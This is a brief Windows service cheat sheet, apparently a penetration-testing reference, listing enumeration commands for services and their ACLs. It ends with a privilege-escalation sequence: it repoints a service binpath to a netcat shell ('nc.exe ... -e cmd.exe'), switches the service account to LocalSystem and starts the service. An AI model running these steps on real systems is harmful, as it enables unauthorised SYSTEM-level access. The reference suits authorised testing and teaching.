# cmd.exe
% windows, service

#plateform/windows #target/local #cat/RECON/SERVICES 


## services - list
```
sc.exe query #List of services
```

## services - list (wmic)
```
wmic service list brief
```

## services - list started
```
net start
```

## services - get ACL (SSDL)
```cmd
sc.exe sdshow <service_name>
```

## services - get config (psservice)
```cmd
.\psservice.exe config '<service_name>' -accepteula
```

## services - get ACL (accesschk)
```cmd
.\accesschk.exe -c <service_name> -l -accepteula
```

## services - get ACL (psservice)
```cmd
.\psservice.exe security '<service_name>' -accepteula
```

## services - get privilege
```
accesschk.exe /accepteula -ucqv <service_name|*>
```

## services - get privilege of a group
```
.\accesschk.exe /accepteula -uwcqv "<group_name|internal\Service Management>" <service_name|*>
```


## services - reconfigure
```
sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
```

## services - change 
```
sc config <service> obj= ".\LocalSystem" password= ""
```

## services - start 
```
net start <service>
```